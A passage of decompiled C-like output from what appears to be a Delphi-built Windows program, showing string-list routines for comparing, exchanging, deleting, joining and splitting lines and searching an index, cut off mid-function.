//----- (0040C94C) --------------------------------------------------------
_DWORD *__usercall sub_40C94C@<eax>(_DWORD *result@<eax>)
{
  if ( !--result[1] )
    return (_DWORD *)(*(int (**)(void))(*result + 48))();
  return result;
}

//----- (0040C960) --------------------------------------------------------
char __usercall sub_40C960@<al>(int a1@<eax>, int a2@<edx>)
{
  int v2; // ebx
  int v3; // esi
  int v4; // ebx
  char v5; // zf
  void *ExceptionList; // [esp-Ch] [ebp-2Ch] BYREF
  void *v8; // [esp-8h] [ebp-28h]
  int *v9; // [esp-4h] [ebp-24h]
  void *v10; // [esp+0h] [ebp-20h]
  int *v11; // [esp+Ch] [ebp-14h] BYREF
  void *v12; // [esp+10h] [ebp-10h] BYREF
  char v13; // [esp+17h] [ebp-9h]
  int v14; // [esp+18h] [ebp-8h]
  int v15; // [esp+1Ch] [ebp-4h]
  int savedregs; // [esp+20h] [ebp+0h] BYREF

  v12 = 0;
  v11 = 0;
  v14 = a2;
  v15 = a1;
  v9 = &savedregs;
  v8 = &loc_40C9F5;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  v13 = 0;
  v2 = (*(int (__stdcall **)(void *))(*(_DWORD *)a1 + 20))(ExceptionList);
  if ( v2 == (*(int (**)(void))(*(_DWORD *)v14 + 20))() )
  {
    if ( v2 - 1 < 0 )
    {
LABEL_6:
      v13 = 1;
    }
    else
    {
      v3 = v2;
      v4 = 0;
      while ( 1 )
      {
        (*(void (__fastcall **)(void **, int))(*(_DWORD *)v15 + 12))(&v12, v4);
        ExceptionList = v12;
        (*(void (__fastcall **)(int **, int))(*(_DWORD *)v14 + 12))(&v11, v4);
        sub_403834((int)ExceptionList, v11);
        if ( !v5 )
          break;
        ++v4;
        if ( !--v3 )
          goto LABEL_6;
      }
    }
  }
  __writefsdword(0, (unsigned int)v8);
  v10 = &loc_40C9FC;
  sub_4034EC((int)&v11, 2);
  return v13;
}
// 40C9D0: variable 'v5' is possibly undefined
// 40C960: using guessed type struct _EXCEPTION_REGISTRATION_RECORD *var_10;

//----- (0040CA08) --------------------------------------------------------
int __usercall sub_40CA08@<eax>(int a1@<ebp>)
{
  return *(_DWORD *)(a1 + 4);
}

//----- (0040CA0C) --------------------------------------------------------
void __userpurge sub_40CA0C(
        unsigned __int8 *a1@<edx>,
        int a2@<ecx>,
        int a3@<ebx>,
        int a4@<ebp>,
        int a5@<esi>,
        DWORD a6,
        DWORD a7,
        DWORD a8,
        const ULONG_PTR *a9)
{
  int v11; // [esp+0h] [ebp-10h] BYREF
  char v12; // [esp+4h] [ebp-Ch]
  int v13; // [esp+8h] [ebp-8h]
  int v14; // [esp+Ch] [ebp-4h]

  v14 = a3;
  v13 = a5;
  sub_40CA08(a4);
  v11 = a2;
  v12 = 0;
  sub_40948C((int)dword_40B7EC, 1, a1, 0, (int)&v11);
  sub_402F98(a6, a7, a8, a9);
}
// 40B7EC: using guessed type int dword_40B7EC[5];

//----- (0040CA44) --------------------------------------------------------
_DWORD *__usercall sub_40CA44@<eax>(int a1@<eax>, int **a2@<edx>, int a3@<ecx>)
{
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-18h] [ebp-1Ch] BYREF
  DWORD v8; // [esp-14h] [ebp-18h]
  int *v9; // [esp-10h] [ebp-14h]
  const ULONG_PTR *v10; // [esp-Ch] [ebp-10h]
  unsigned int v11; // [esp-8h] [ebp-Ch]
  char *v12; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v12 = 0;
  v9 = &savedregs;
  v8 = (DWORD)&loc_40CA8C;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_404B80(a2, &v12);
  sub_40CA0C((unsigned __int8 *)v12, a3, a1, (int)&savedregs, (int)a2, (DWORD)ExceptionList, v8, (DWORD)v9, v10);
  __writefsdword(0, v11);
  v12 = (char *)&loc_40CA93;
  return sub_4034C8(&v12);
}

//----- (0040CA9C) --------------------------------------------------------
int __usercall sub_40CA9C@<eax>(_DWORD *a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  int v5; // eax
  _DWORD v7[3]; // [esp-18h] [ebp-34h] BYREF
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-28h] BYREF
  void *v9; // [esp-8h] [ebp-24h]
  int *v10; // [esp-4h] [ebp-20h]
  void *v11; // [esp+0h] [ebp-1Ch]
  int v12; // [esp+Ch] [ebp-10h] BYREF
  int v13; // [esp+10h] [ebp-Ch] BYREF
  int v14; // [esp+14h] [ebp-8h]
  _DWORD *v15; // [esp+18h] [ebp-4h]
  int savedregs; // [esp+1Ch] [ebp+0h] BYREF

  v12 = 0;
  v13 = 0;
  v15 = a1;
  v10 = &savedregs;
  v9 = &loc_40CB74;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_40C890(a1);
  v7[2] = &savedregs;
  v7[1] = &loc_40CB52;
  v7[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  (*(void (__fastcall **)(int *, int, _DWORD, void *, int *, struct _EXCEPTION_REGISTRATION_RECORD *))(*v15 + 12))(
    &v13,
    a2,
    v7[0],
    &loc_40CB52,
    &savedregs,
    ExceptionList);
  v14 = (*(int (**)(void))(*v15 + 24))();
  (*(void (__fastcall **)(int *, int))(*v15 + 12))(&v12, a3);
  (*(void (__fastcall **)(int, int))(*v15 + 32))(v12, a2);
  v5 = (*(int (**)(void))(*v15 + 24))();
  (*(void (__fastcall **)(int, int))(*v15 + 36))(v5, a2);
  (*(void (__fastcall **)(int, int))(*v15 + 32))(v13, a3);
  (*(void (__fastcall **)(int, int))(*v15 + 36))(v14, a3);
  __writefsdword(0, (unsigned int)v9);
  v11 = &loc_40CB59;
  sub_40C94C(v15);
  __writefsdword(0, (unsigned int)v9);
  v11 = &loc_40CB7B;
  return sub_4034EC((int)&v12, 2);
}

//----- (0040CB84) --------------------------------------------------------
int __usercall sub_40CB84@<eax>(int a1@<eax>)
{
  return (*(int (**)(void))(*(_DWORD *)a1 + 20))();
}

//----- (0040CB8C) --------------------------------------------------------
int sub_40CB8C()
{
  return 0;
}

//----- (0040CB90) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
char *__usercall sub_40CB90@<eax>(int a1@<eax>)
{
  char *v1; // eax
  char *v2; // ebx
  _DWORD v4[4]; // [esp-10h] [ebp-14h] BYREF
  char *v5; // [esp+0h] [ebp-4h] BYREF
  void *savedregs; // [esp+4h] [ebp+0h] BYREF

  v5 = 0;
  v4[2] = &savedregs;
  v4[1] = &loc_40CBD5;
  v4[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v4);
  (*(void (__stdcall **)(_DWORD, void *, void **))(*(_DWORD *)a1 + 28))(v4[0], &loc_40CBD5, &savedregs);
  v1 = sub_4038E8(v5);
  v2 = sub_40765C(v1);
  __writefsdword(0, v4[3]);
  savedregs = &loc_40CBDC;
  sub_4034C8(&v5);
  return v2;
}
// 40CBCF: bad sp value at call

//----- (0040CBE4) --------------------------------------------------------
int __usercall sub_40CBE4@<eax>(int a1@<eax>, char **a2@<edx>)
{
  int v2; // eax
  int v3; // ebx
  int v4; // esi
  char *v5; // ebx
  int v6; // esi
  int v7; // edi
  _BYTE *v8; // ebx
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-30h] BYREF
  void *v11; // [esp-8h] [ebp-2Ch]
  int *v12; // [esp-4h] [ebp-28h]
  void *v13; // [esp+0h] [ebp-24h]
  int v14; // [esp+Ch] [ebp-18h] BYREF
  char *v15; // [esp+10h] [ebp-14h] BYREF
  int v16; // [esp+14h] [ebp-10h]
  int v17; // [esp+18h] [ebp-Ch]
  char **v18; // [esp+1Ch] [ebp-8h]
  int v19; // [esp+20h] [ebp-4h]
  int savedregs; // [esp+24h] [ebp+0h] BYREF

  v14 = 0;
  v15 = 0;
  v18 = a2;
  v19 = a1;
  v12 = &savedregs;
  v11 = &loc_40CCBB;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  v2 = (*(int (__stdcall **)(struct _EXCEPTION_REGISTRATION_RECORD *))(*(_DWORD *)a1 + 20))(ExceptionList);
  v16 = v2;
  v3 = 0;
  if ( v2 - 1 >= 0 )
  {
    v4 = v2;
    v17 = 0;
    do
    {
      (*(void (__fastcall **)(int *, int))(*(_DWORD *)v19 + 12))(&v14, v17);
      v3 += sub_403724(v14) + 2;
      ++v17;
      --v4;
    }
    while ( v4 );
  }
  sub_4035B0(v18, 0, v3);
  v5 = *v18;
  if ( v16 - 1 >= 0 )
  {
    v6 = v16;
    v17 = 0;
    do
    {
      (*(void (__fastcall **)(char **, int))(*(_DWORD *)v19 + 12))(&v15, v17);
      v7 = sub_403724((int)v15);
      if ( v7 )
      {
        sub_4026B0(v15, v5, v7);
        v5 += v7;
      }
      *v5 = 13;
      v8 = v5 + 1;
      *v8 = 10;
      v5 = v8 + 1;
      ++v17;
      --v6;
    }
    while ( v6 );
  }
  __writefsdword(0, (unsigned int)v11);
  v13 = &loc_40CCC2;
  return sub_4034EC((int)&v14, 2);
}

//----- (0040CCCC) --------------------------------------------------------
int __usercall sub_40CCCC@<eax>(int a1@<eax>, char *a2@<edx>)
{
  int v2; // eax
  int v3; // ebx
  int v4; // esi
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-24h] BYREF
  void *v7; // [esp-8h] [ebp-20h]
  int *v8; // [esp-4h] [ebp-1Ch]
  void *v9; // [esp+0h] [ebp-18h]
  char *v10; // [esp+Ch] [ebp-Ch] BYREF
  char *v11; // [esp+10h] [ebp-8h]
  int v12; // [esp+14h] [ebp-4h]
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v10 = 0;
  v11 = a2;
  v12 = a1;
  v8 = &savedregs;
  v7 = &loc_40CD39;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  v2 = (*(int (__stdcall **)(struct _EXCEPTION_REGISTRATION_RECORD *))(*(_DWORD *)a1 + 20))(ExceptionList);
  if ( v2 - 1 < 0 )
  {
LABEL_5:
    v4 = -1;
  }
  else
  {
    v3 = v2;
    v4 = 0;
    while ( 1 )
    {
      (*(void (__fastcall **)(char **, int))(*(_DWORD *)v12 + 12))(&v10, v4);
      if ( !sub_406E64(v10, v11) )
        break;
      ++v4;
      if ( !--v3 )
        goto LABEL_5;
    }
  }
  __writefsdword(0, (unsigned int)v7);
  v9 = &loc_40CD40;
  sub_4034C8(&v10);
  return v4;
}

//----- (0040CD4C) --------------------------------------------------------
int __userpurge sub_40CD4C@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4)
{
  (*(void (__fastcall **)(int, int))(*(_DWORD *)a1 + 84))(a3, a2);
  return (*(int (__fastcall **)(int, int))(*(_DWORD *)a1 + 36))(a4, a2);
}

//----- (0040CD7C) --------------------------------------------------------
_DWORD *__usercall sub_40CD7C@<eax>(int a1@<eax>, char *a2@<edx>)
{
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-14h] BYREF
  void *v5; // [esp-8h] [ebp-10h]
  int *v6; // [esp-4h] [ebp-Ch]
  void *v7; // [esp+0h] [ebp-8h]
  _DWORD *v8; // [esp+4h] [ebp-4h]
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v8 = sub_40D940(off_40BD88, 1, a2, 32);
  v6 = &savedregs;
  v5 = &loc_40CDC4;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  (*(void (__stdcall **)(struct _EXCEPTION_REGISTRATION_RECORD *))(*(_DWORD *)a1 + 92))(ExceptionList);
  __writefsdword(0, (unsigned int)v5);
  v7 = &loc_40CDCB;
  return sub_402BDC(v8);
}
// 40BD88: using guessed type int (*off_40BD88[4])();

//----- (0040CDD0) --------------------------------------------------------
_DWORD *__usercall sub_40CDD0@<eax>(_DWORD *a1@<eax>, int a2@<edx>)
{
  int v3; // esi
  int v4; // esi
  struct _EXCEPTION_REGISTRATION_RECORD *v6; // [esp-18h] [ebp-28h] BYREF
  void *v7; // [esp-14h] [ebp-24h]
  int *v8; // [esp-10h] [ebp-20h]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-1Ch] BYREF
  void *v10; // [esp-8h] [ebp-18h]
  int *v11; // [esp-4h] [ebp-14h]
  void *v12; // [esp+0h] [ebp-10h]
  char *v13; // [esp+8h] [ebp-8h] BYREF
  _DWORD *v14; // [esp+Ch] [ebp-4h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v13 = 0;
  v14 = a1;
  v11 = &savedregs;
  v10 = &loc_40CE6E;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_40C890(a1);
  v8 = &savedregs;
  v7 = &loc_40CE51;
  v6 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v6);
  v3 = sub_40D84C(a2);
  v4 = v3 - sub_40D830(a2);
  sub_4035B0(&v13, 0, v4);
  (*(void (__fastcall **)(int, char *, struct _EXCEPTION_REGISTRATION_RECORD *, void *, int *, struct _EXCEPTION_REGISTRATION_RECORD *))(*(_DWORD *)a2 + 4))(
    v4,
    v13,
    v6,
    v7,
    v8,
    ExceptionList);
  (*(void (**)(void))(*v14 + 44))();
  __writefsdword(0, (unsigned int)v10);
  v12 = &loc_40CE58;
  sub_40C94C(v14);
  __writefsdword(0, (unsigned int)v10);
  v12 = &loc_40CE75;
  return sub_4034C8(&v13);
}

//----- (0040CE7C) --------------------------------------------------------
_DWORD *__usercall sub_40CE7C@<eax>(_DWORD *a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  int v5; // edi
  _DWORD v7[3]; // [esp-18h] [ebp-2Ch] BYREF
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-20h] BYREF
  void *v9; // [esp-8h] [ebp-1Ch]
  int *v10; // [esp-4h] [ebp-18h]
  void *v11; // [esp+0h] [ebp-14h]
  int v12; // [esp+Ch] [ebp-8h] BYREF
  _DWORD *v13; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v12 = 0;
  v13 = a1;
  v10 = &savedregs;
  v9 = &loc_40CF1D;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  if ( a3 != a2 )
  {
    sub_40C890(v13);
    v7[2] = &savedregs;
    v7[1] = &loc_40CF00;
    v7[0] = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v7);
    (*(void (__fastcall **)(int *, int, _DWORD, void *, int *, struct _EXCEPTION_REGISTRATION_RECORD *))(*v13 + 12))(
      &v12,
      a2,
      v7[0],
      &loc_40CF00,
      &savedregs,
      ExceptionList);
    v5 = (*(int (**)(void))(*v13 + 24))();
    (*(void (**)(void))(*v13 + 68))();
    sub_40CD4C((int)v13, a3, v12, v5);
    __writefsdword(0, (unsigned int)v9);
    v11 = &loc_40CF07;
    sub_40C94C(v13);
  }
  __writefsdword(0, (unsigned int)ExceptionList);
  v10 = (int *)&loc_40CF24;
  return sub_4034C8(&v12);
}

//----- (0040CF2C) --------------------------------------------------------
int __usercall sub_40CF2C@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  int v6; // edi

  v6 = (*(int (**)(void))(*(_DWORD *)a1 + 24))();
  (*(void (**)(void))(*(_DWORD *)a1 + 68))();
  return sub_40CD4C(a1, a2, a3, v6);
}

//----- (0040CF60) --------------------------------------------------------
_DWORD *__usercall sub_40CF60@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edx>)
{
  int v2; // ecx
  int v3; // ecx
  void *v4; // ecx
  _DWORD v6[3]; // [esp-18h] [ebp-24h] BYREF
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-18h] BYREF
  void *v8; // [esp-8h] [ebp-14h]
  int *v9; // [esp-4h] [ebp-10h]
  char *v10; // [esp+0h] [ebp-Ch] BYREF
  _DWORD *v11; // [esp+4h] [ebp-8h]
  _DWORD *v12; // [esp+8h] [ebp-4h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v10 = 0;
  v11 = a2;
  v12 = a1;
  v9 = &savedregs;
  v8 = &loc_40D004;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_40DEA0(a2, 0);
  sub_40C890(v12);
  v6[2] = &savedregs;
  v6[1] = &loc_40CFDF;
  v6[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  (*(void (__stdcall **)(_DWORD, void *, int *, struct _EXCEPTION_REGISTRATION_RECORD *))(*v12 + 64))(
    v6[0],
    &loc_40CFDF,
    &savedregs,
    ExceptionList);
  while ( !sub_40DDF4(v11, v2) )
  {
    sub_40DEEC(v11, &v10, v3);
    (*(void (**)(void))(*v12 + 52))();
  }
  __writefsdword(0, (unsigned int)v8);
  v10 = (char *)&loc_40CFE6;
  sub_40C94C(v12);
  sub_40DEA8(v4, v11);
  __writefsdword(0, (unsigned int)v8);
  v10 = (char *)&loc_40D00B;
  return sub_4034C8(&v10);
}
// 40CFAD: variable 'v3' is possibly undefined
// 40CFC0: variable 'v2' is possibly undefined
// 40CFE9: variable 'v4' is possibly undefined

//----- (0040D010) --------------------------------------------------------
_DWORD *__usercall sub_40D010@<eax>(int a1@<eax>, char *a2@<edx>)
{
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-14h] BYREF
  void *v5; // [esp-8h] [ebp-10h]
  int *v6; // [esp-4h] [ebp-Ch]
  void *v7; // [esp+0h] [ebp-8h]
  _DWORD *v8; // [esp+4h] [ebp-4h]
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v8 = sub_40D940(off_40BD88, 1, a2, 0xFFFF);
  v6 = &savedregs;
  v5 = &loc_40D05B;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  (*(void (__stdcall **)(struct _EXCEPTION_REGISTRATION_RECORD *))(*(_DWORD *)a1 + 104))(ExceptionList);
  __writefsdword(0, (unsigned int)v5);
  v7 = &loc_40D062;
  return sub_402BDC(v8);
}
// 40BD88: using guessed type int (*off_40BD88[4])();

//----- (0040D068) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
_DWORD *__usercall sub_40D068@<eax>(int a1@<eax>, int a2@<edx>, int a3@<esi>)
{
  int v4; // eax
  _DWORD v6[3]; // [esp-14h] [ebp-18h] BYREF
  int v7; // [esp-8h] [ebp-Ch]
  unsigned int v8; // [esp-4h] [ebp-8h]
  int v9; // [esp+0h] [ebp-4h] BYREF
  void *savedregs; // [esp+4h] [ebp+0h] BYREF

  v9 = 0;
  v7 = a3;
  v6[2] = &savedregs;
  v6[1] = &loc_40D0B5;
  v6[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  (*(void (__stdcall **)(_DWORD, void *, void **, int))(*(_DWORD *)a1 + 28))(v6[0], &loc_40D0B5, &savedregs, v7);
  v4 = sub_403724(v9);
  sub_40D8BC(a2, v9, v4);
  __writefsdword(0, v8);
  savedregs = &loc_40D0BC;
  return sub_4034C8(&v9);
}
// 40D068: could not find valid save-restore pair for esi
// 40D0AF: bad sp value at call

//----- (0040D0C8) --------------------------------------------------------
int *__usercall sub_40D0C8@<eax>(int a1@<eax>, int a2@<edx>)
{
  int *result; // eax

  if ( *(_DWORD *)(a1 + 8) )
    (*(void (**)(void))(**(_DWORD **)(a1 + 8) + 16))();
  result = sub_404BF0((int *)(a1 + 8), a2);
  if ( *(_DWORD *)(a1 + 8) )
    return (int *)(*(int (**)(void))(**(_DWORD **)(a1 + 8) + 12))();
  return result;
}

//----- (0040D0FC) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
_DWORD *__usercall sub_40D0FC@<eax>(int a1@<eax>, char *a2@<edx>)
{
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-14h] [ebp-18h] BYREF
  void *v5; // [esp-10h] [ebp-14h]
  void **v6; // [esp-Ch] [ebp-10h]
  int v7; // [esp-8h] [ebp-Ch]
  unsigned int v8; // [esp-4h] [ebp-8h]
  char *v9; // [esp+0h] [ebp-4h] BYREF
  void *savedregs; // [esp+4h] [ebp+0h] BYREF

  v9 = 0;
  v6 = &savedregs;
  v5 = &loc_40D13F;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_403680(&v9, a2);
  (*(void (__stdcall **)(struct _EXCEPTION_REGISTRATION_RECORD *, void *, void **, int))(*(_DWORD *)a1 + 44))(
    ExceptionList,
    v5,
    v6,
    v7);
  __writefsdword(0, v8);
  savedregs = &loc_40D146;
  return sub_4034C8(&v9);
}
// 40D139: bad sp value at call

//----- (0040D14C) --------------------------------------------------------
_DWORD *__usercall sub_40D14C@<eax>(_DWORD *a1@<eax>, char *a2@<edx>)
{
  char *v3; // eax
  _DWORD v5[3]; // [esp-18h] [ebp-24h] BYREF
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-18h] BYREF
  void *v7; // [esp-8h] [ebp-14h]
  int *v8; // [esp-4h] [ebp-10h]
  void *v9; // [esp+0h] [ebp-Ch]
  char *v10; // [esp+4h] [ebp-8h] BYREF
  _DWORD *v11; // [esp+8h] [ebp-4h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v10 = 0;
  v11 = a1;
  v8 = &savedregs;
  v7 = &loc_40D200;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_40C890(a1);
  v5[2] = &savedregs;
  v5[1] = &loc_40D1E3;
  v5[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  (*(void (__stdcall **)(_DWORD, void *, int *, struct _EXCEPTION_REGISTRATION_RECORD *))(*v11 + 64))(
    v5[0],
    &loc_40D1E3,
    &savedregs,
    ExceptionList);
  if ( a2 )
  {
    while ( *a2 )
    {
      v3 = a2;
      while ( *a2 && *a2 != 10 && *a2 != 13 )
        ++a2;
      sub_4035B0(&v10, v3, a2 - v3);
      (*(void (**)(void))(*v11 + 52))();
      if ( *a2 == 13 )
        ++a2;
      if ( *a2 == 10 )
        ++a2;
    }
  }
  __writefsdword(0, (unsigned int)v7);
  v9 = &loc_40D1EA;
  sub_40C94C(v11);
  __writefsdword(0, (unsigned int)v7);
  v9 = &loc_40D207;
  return sub_4034C8(&v10);
}

//----- (0040D210) --------------------------------------------------------
_DWORD *__usercall sub_40D210@<eax>(int a1@<eax>, int *a2@<edx>)
{
  int v2; // eax
  int v3; // ecx
  int v4; // ebx
  int v5; // esi
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-24h] BYREF
  void *v8; // [esp-8h] [ebp-20h]
  int *v9; // [esp-4h] [ebp-1Ch]
  void *v10; // [esp+0h] [ebp-18h]
  char *v11; // [esp+Ch] [ebp-Ch] BYREF
  int *v12; // [esp+10h] [ebp-8h]
  int v13; // [esp+14h] [ebp-4h]
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v11 = 0;
  v12 = a2;
  v13 = a1;
  v9 = &savedregs;
  v8 = &loc_40D286;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_40E2C0(a2, 0);
  v2 = (*(int (__stdcall **)(struct _EXCEPTION_REGISTRATION_RECORD *))(*(_DWORD *)v13 + 20))(ExceptionList);
  if ( v2 - 1 >= 0 )
  {
    v4 = v2;
    v5 = 0;
    do
    {
      (*(void (__fastcall **)(char **, int))(*(_DWORD *)v13 + 12))(&v11, v5);
      sub_40E2D0(v12, v11);
      ++v5;
      --v4;
    }
    while ( v4 );
  }
  sub_40E2C8(v12, v3);
  __writefsdword(0, (unsigned int)v8);
  v10 = &loc_40D28D;
  return sub_4034C8(&v11);
}
// 40D26B: variable 'v3' is possibly undefined

//----- (0040D294) --------------------------------------------------------
int __usercall sub_40D294@<eax>(_DWORD *a1@<eax>, char a2@<dl>)
{
  _DWORD *v2; // eax
  char v3; // dl
  char v4; // bl
  _DWORD *v5; // esi
  int result; // eax

  v2 = sub_402D3C(a1, a2);
  v4 = v3;
  v5 = v2;
  v2[8] = 0;
  v2[9] = 0;
  v2[10] = 0;
  v2[11] = 0;
  sub_40C6F0(v2, v3 & 0xFC);
  if ( v5[4] )
    sub_403BE8((int *)v5[3], (char *)dword_40BB48, v5[4]);
  v5[4] = 0;
  result = (*(int (**)(void))(*v5 + 40))();
  if ( v4 > 0 )
    return sub_402D2C(v5);
  return result;
}
// 40D29B: variable 'v3' is possibly undefined
// 40BB48: using guessed type int dword_40BB48[5];

//----- (0040D2F0) --------------------------------------------------------
int __usercall sub_40D2F0@<eax>(int a1@<eax>, __int32 a2@<edx>, int a3@<ecx>)
{
  char v5; // al
  bool v6; // cf
  char v7; // al
  int v9[4]; // [esp+0h] [ebp-10h] BYREF

  v9[0] = a3;
  if ( !*(_BYTE *)(a1 + 24) )
  {
    v9[0] = *(_DWORD *)(a1 + 16);
LABEL_7:
    sub_40D618((_DWORD *)a1, v9[0], a2);
    return v9[0];
  }
  if ( !(*(unsigned __int8 (__fastcall **)(int *, __int32))(*(_DWORD *)a1 + 120))(v9, a2) )
    goto LABEL_7;
  v5 = *(_BYTE *)(a1 + 25);
  v6 = v5 == 0;
  v7 = v5 - 1;
  if ( !v6 )
  {
    if ( v7 == 1 )
      sub_40CA44(a1, (int **)off_41DB24[0], 0);
    goto LABEL_7;
  }
  return v9[0];
}
// 41DB24: using guessed type int *off_41DB24[3];
// 40D2F0: using guessed type int var_10[4];

//----- (0040D348) --------------------------------------------------------
int __usercall sub_40D348@<eax>(int result@<eax>, int a2@<ecx>)
{
  if ( !*(_DWORD *)(result + 4) )
  {
    if ( *(_WORD *)(result + 34) )
      return (*(int (__fastcall **)(int, int))(result + 32))(a2, result);
  }
  return result;
}

//----- (0040D364) --------------------------------------------------------
int __usercall sub_40D364@<eax>(int result@<eax>, int a2@<ecx>)
{
  if ( !*(_DWORD *)(result + 4) )
  {
    if ( *(_WORD *)(result + 42) )
      return (*(int (__fastcall **)(int, int))(result + 40))(a2, result);
  }
  return result;
}

//----- (0040D380) --------------------------------------------------------
_DWORD *__usercall sub_40D380@<eax>(_DWORD *result@<eax>)
{
  _DWORD *v1; // ebx

  v1 = result;
  if ( result[4] )
  {
    (*(void (**)(void))(*result + 116))();
    sub_403BE8((int *)v1[3], (char *)dword_40BB48, v1[4]);
    v1[4] = 0;
    (*(void (**)(void))(*v1 + 40))();
    return (_DWORD *)(*(int (**)(void))(*v1 + 112))();
  }
  return result;
}
// 40BB48: using guessed type int dword_40BB48[5];

//----- (0040D3B8) --------------------------------------------------------
int __usercall sub_40D3B8@<eax>(_DWORD *a1@<eax>, int a2@<edx>)
{
  int v4; // eax

  if ( a2 < 0 || a2 >= a1[4] )
    sub_40CA44((int)a1, off_41DC24[0], a2);
  (*(void (**)(void))(*a1 + 116))();
  sub_403CD0((int *)(a1[3] + 8 * a2), (char *)dword_40BB48);
  v4 = --a1[4];
  if ( a2 < v4 )
    sub_4026B0((char *)(a1[3] + 8 * a2 + 8), (char *)(a1[3] + 8 * a2), 8 * (v4 - a2));
  return (*(int (**)(void))(*a1 + 112))();
}
// 40BB48: using guessed type int dword_40BB48[5];
// 41DC24: using guessed type int **off_41DC24[3];

//----- (0040D41C) --------------------------------------------------------
int __usercall sub_40D41C@<eax>(_DWORD *a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  if ( a2 < 0 || a2 >= a1[4] )
    sub_40CA44((int)a1, off_41DC24[0], a2);
  if ( a3 < 0 || a3 >= a1[4] )
    sub_40CA44((int)a1, off_41DC24[0], a3);
  (*(void (**)(void))(*a1 + 116))();
  sub_40D474((int)a1, a2, a3);
  return (*(int (**)(void))(*a1 + 112))();
}
// 41DC24: using guessed type int **off_41DC24[3];

//----- (0040D474) --------------------------------------------------------
int *__usercall sub_40D474@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  int *v3; // edx
  int *result; // eax
  int v5; // ecx
  int v6; // ecx

  v3 = (int *)(*(_DWORD *)(a1 + 12) + 8 * a2);
  result = (int *)(*(_DWORD *)(a1 + 12) + 8 * a3);
  v5 = *v3;
  *v3 = *result;
  *result = v5;
  v6 = v3[1];
  v3[1] = result[1];
  result[1] = v6;
  return result;
}

//----- (0040D498) --------------------------------------------------------
char __usercall sub_40D498@<al>(int a1@<eax>, char *a2@<edx>, signed int *a3@<ecx>)
{
  signed int v4; // esi
  int v5; // edi
  unsigned int v6; // ebx
  int v7; // eax
  char v11; // [esp+8h] [ebp-14h]

  v11 = 0;
  v4 = 0;
  v5 = *(_DWORD *)(a1 + 16) - 1;
  if ( v5 >= 0 )
  {
    do
    {
      v6 = (unsigned int)(v5 + v4) >> 1;
      v7 = sub_406E64(*(char **)(*(_DWORD *)(a1 + 12) + 8 * v6), a2);
